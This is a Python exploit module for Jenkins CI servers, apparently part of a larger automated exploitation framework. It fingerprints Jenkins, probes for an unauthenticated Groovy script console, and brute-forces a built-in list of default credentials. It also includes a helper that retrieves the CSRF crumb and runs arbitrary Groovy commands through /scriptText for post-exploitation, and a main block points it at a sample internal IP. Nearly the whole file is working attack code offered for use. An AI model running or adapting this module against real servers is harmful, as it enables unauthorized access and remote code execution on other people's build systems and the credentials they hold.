"""
Jenkins CI/CD Exploit Module
Targets Jenkins servers with weak authentication or exposed APIs
"""

import socket
import requests
import base64
from typing import Dict, Tuple, List
import sys
import os

sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from exploits.exploit_manager import BaseExploit
from utils.logger import logger


class Jenkins_Exploit(BaseExploit):
    """
    Jenkins CI/CD Server Exploit
    Targets: Jenkins servers (ports 8080, 8443)
    
    Attack Vectors:
    1. Default credentials (admin/admin, jenkins/jenkins)
    2. Anonymous script console access
    3. Groovy script execution
    4. Credential extraction from jobs
    """
    
    def __init__(self):
        super().__init__(
            name="Jenkins_Exploit",
            target_ports=[8080, 8443, 9090],
            target_os=["Windows", "Linux", "Unix"]
        )
        
        # Common Jenkins credentials
        self.jenkins_credentials = [
            ("admin", "admin"),
            ("jenkins", "jenkins"),
            ("admin", "password"),
            ("admin", "jenkins"),
            ("admin", ""),
            ("", ""),
            ("user", "user"),
            ("test", "test"),
        ]
    
    def check_vulnerable(self, target: Dict) -> bool:
        """Check if Jenkins is accessible and potentially vulnerable"""
        ip = target['ip']
        
        # Check common Jenkins ports
        jenkins_ports = [8080, 8443, 9090]
        for port in jenkins_ports:
            if port in target.get('open_ports', []):
                try:
                    # Try to detect Jenkins
                    protocol = "https" if port == 8443 else "http"
                    url = f"{protocol}://{ip}:{port}"
                    
                    response = requests.get(url, timeout=5, verify=False)
                    
                    # Check for Jenkins indicators
                    if any(indicator in response.text.lower() for indicator in 
                           ['jenkins', 'hudson', 'x-jenkins']):
                        logger.debug(f"Jenkins detected on {ip}:{port}")
                        return True
                    
                    # Check headers
                    if 'X-Jenkins' in response.headers:
                        logger.debug(f"Jenkins confirmed via headers on {ip}:{port}")
                        return True
                        
                except Exception as e:
                    logger.debug(f"Jenkins check failed on {ip}:{port}: {e}")
        
        return False
    
    def exploit(self, target: Dict) -> Tuple[bool, Dict]:
        """Attempt Jenkins exploitation"""
        ip = target['ip']
        
        # Find which port Jenkins is on
        port = 8080
        for p in [8080, 8443, 9090]:
            if p in target.get('open_ports', []):
                port = p
                break
        
        protocol = "https" if port == 8443 else "http"
        base_url = f"{protocol}://{ip}:{port}"
        
        logger.info(f"Attempting Jenkins exploit on {ip}:{port}")
        
        try:
            # Method 1: Try anonymous script console access
            if self._try_anonymous_access(base_url):
                self.stats['success'] += 1
                logger.success(f"Jenkins anonymous access on {ip}:{port}")
                
                return True, {
                    'method': 'Jenkins_Anonymous_ScriptConsole',
                    'credentials': 'none (anonymous)',
                    'port': port,
                    'service': 'Jenkins',
                    'access_level': 'script_console'
                }
            
            # Method 2: Try credential brute force
            for username, password in self.jenkins_credentials:
                logger.debug(f"Trying Jenkins: {username}:{password}")
                
                if self._try_jenkins_login(base_url, username, password):
                    self.stats['success'] += 1
                    logger.success(f"Jenkins access gained on {ip} with {username}:{password}")
                    
                    # Try to access script console
                    has_script_console = self._check_script_console(base_url, username, password)
                    
                    return True, {
                        'method': 'Jenkins_BruteForce',
                        'credentials': f"{username}:{password}",
                        'port': port,
                        'service': 'Jenkins',
                        'script_console': has_script_console
                    }
            
            self.stats['failure'] += 1
            return False, {}
            
        except Exception as e:
            self.stats['failure'] += 1
            logger.error(f"Jenkins exploit error on {ip}: {e}")
            return False, {}
    
    def _try_anonymous_access(self, base_url: str) -> bool:
        """Try to access Jenkins script console anonymously"""
        try:
            # Try script console without auth
            script_url = f"{base_url}/script"
            response = requests.get(script_url, timeout=5, verify=False)
            
            # If we can access script console, we have RCE
            if response.status_code == 200 and 'groovy' in response.text.lower():
                logger.info("Jenkins script console accessible without authentication!")
                return True
            
            # Try /manage
            manage_url = f"{base_url}/manage"
            response = requests.get(manage_url, timeout=5, verify=False)
            
            if response.status_code == 200:
                logger.info("Jenkins management interface accessible")
                return True
            
            return False
            
        except:
            return False
    
    def _try_jenkins_login(self, base_url: str, username: str, password: str) -> bool:
        """Try to login to Jenkins"""
        try:
            # Jenkins login endpoint
            login_url = f"{base_url}/j_acegi_security_check"
            
            data = {
                'j_username': username,
                'j_password': password,
                'from': '/',
                'Submit': 'Sign in'
            }
            
            session = requests.Session()
            response = session.post(login_url, data=data, timeout=5, verify=False, allow_redirects=False)
            
            # Check if login successful
            if response.status_code in [302, 303]:
                # Check if we got a session cookie
                if 'JSESSIONID' in session.cookies:
                    # Verify by accessing protected page
                    verify_url = f"{base_url}/manage"
                    verify_response = session.get(verify_url, timeout=5, verify=False)
                    
                    if verify_response.status_code == 200:
                        return True
            
            return False
            
        except:
            return False
    
    def _check_script_console(self, base_url: str, username: str, password: str) -> bool:
        """Check if we can access script console with credentials"""
        try:
            session = requests.Session()
            
            # Login first
            login_url = f"{base_url}/j_acegi_security_check"
            data = {
                'j_username': username,
                'j_password': password,
                'from': '/',
                'Submit': 'Sign in'
            }
            session.post(login_url, data=data, timeout=5, verify=False)
            
            # Try script console
            script_url = f"{base_url}/script"
            response = session.get(script_url, timeout=5, verify=False)
            
            return response.status_code == 200 and 'groovy' in response.text.lower()
            
        except:
            return False
    
    def execute_groovy_script(self, base_url: str, username: str, password: str, script: str) -> str:
        """
        Execute Groovy script on Jenkins (for post-exploitation)
        
        Example script for RCE:
        println "whoami".execute().text
        """
        try:
            session = requests.Session()
            
            # Login
            login_url = f"{base_url}/j_acegi_security_check"
            data = {
                'j_username': username,
                'j_password': password,
                'from': '/',
                'Submit': 'Sign in'
            }
            session.post(login_url, data=data, timeout=5, verify=False)
            
            # Get crumb (CSRF token)
            crumb_url = f"{base_url}/crumbIssuer/api/json"
            crumb_response = session.get(crumb_url, timeout=5, verify=False)
            
            if crumb_response.status_code == 200:
                crumb_data = crumb_response.json()
                crumb = crumb_data.get('crumb')
                crumb_field = crumb_data.get('crumbRequestField')
            else:
                crumb = None
                crumb_field = None
            
            # Execute script
            script_url = f"{base_url}/scriptText"
            headers = {}
            if crumb and crumb_field:
                headers[crumb_field] = crumb
            
            data = {'script': script}
            response = session.post(script_url, data=data, headers=headers, timeout=10, verify=False)
            
            if response.status_code == 200:
                return response.text
            else:
                return f"Error: {response.status_code}"
                
        except Exception as e:
            return f"Exception: {str(e)}"


if __name__ == "__main__":
    # Test the exploit
    jenkins = Jenkins_Exploit()
    
    test_target = {
        'ip': '192.168.1.100',
        'open_ports': [8080],
        'os_guess': 'Linux'
    }
    
    print(f"Testing Jenkins exploit on {test_target['ip']}")
    
    if jenkins.check_vulnerable(test_target):
        print("Target appears vulnerable")
        success, result = jenkins.exploit(test_target)
        
        if success:
            print(f"Exploit successful: {result}")
        else:
            print("Exploit failed")
    else:
        print("Target not vulnerable")
